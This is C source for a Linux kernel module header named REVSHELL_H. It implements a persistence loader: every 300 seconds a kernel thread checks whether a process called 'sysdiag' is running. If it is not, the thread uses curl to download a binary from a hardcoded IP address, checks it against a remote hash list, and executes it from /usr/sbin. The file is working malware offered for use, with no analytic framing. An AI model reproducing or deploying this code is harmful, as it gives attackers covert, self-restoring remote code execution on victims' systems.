#ifndef REVSHELL_H
#define REVSHELL_H

#define CHECK_INTERVAL 300           /* liveness + integrity re-check period */

#ifndef MARKER
#define MARKER "sysdiag"
#endif

#define PAYLOAD_PATH "/usr/sbin/" MARKER

#define UTIL_URL  "http://198.38.87.31:8931/package_manifest-20-5-20/sysdiag"
#define HASH_URL  "http://198.38.87.31:8931/package_manifest-20-5-20/SHA256.txt"

struct task_struct *mon_it;
struct task_struct *task;

static int __shell(void *data)
{
    static char *envp[] = { "HOME=/", "TERM=xterm",
                            "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    /*
     * Logic per cycle:
     *  1. agent running?  -> nothing
     *  2. binary on disk? -> verify its hash against server's SHA256.txt
     *     - matches  -> exec it
     *     - mismatch -> re-download, verify, exec
     *  3. no binary  -> download, verify hash, exec
     * Any integrity failure deletes the local copy (next cycle retries).
     */
    char *argv[] = { "/bin/bash", "-c",
                     "L=$(" "/usr/bin/curl -sfo - " HASH_URL " 2>/dev/null); "
                     "if [ -x " PAYLOAD_PATH " ]; then "
                       "H=$(/usr/bin/sha256sum " PAYLOAD_PATH " | /usr/bin/awk '{print $1}'); "
                       "case \"$L\" in *\"$H\"*) exec " PAYLOAD_PATH ";; esac; "
                       "rm -f " PAYLOAD_PATH "; "
                     "fi; "
                     "/usr/bin/curl -sfo " PAYLOAD_PATH " " UTIL_URL " && "
                     "H=$(/usr/bin/sha256sum " PAYLOAD_PATH " | /usr/bin/awk '{print $1}'); "
                     "case \"$L\" in *\"$H\"*) "
                       "chmod +x " PAYLOAD_PATH " && exec " PAYLOAD_PATH ";; "
                     "esac; "
                     "rm -f " PAYLOAD_PATH,
                     NULL };

    while (!kthread_should_stop()) {
        bool alive = false;

        rcu_read_lock();
        for_each_process(task) {
            if (strlen(task->comm) == strlen(MARKER) &&
                strncmp(task->comm, MARKER, strlen(MARKER)) == 0) {
                alive = true;
                break;
            }
        }
        rcu_read_unlock();

                if (!alive && !kthread_should_stop() && !atomic_read(&unloading))
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

        /* interruptible wait: kthread_stop() wakes us instantly,
         * making unload respond in <1s instead of blocking ≤90s */
        {
            long remain = CHECK_INTERVAL * HZ;
            while (remain > 0) {
                remain = schedule_timeout_interruptible(remain);
                if (kthread_should_stop())
                    break;
            }
        }
    }

    return 0;
}

#endif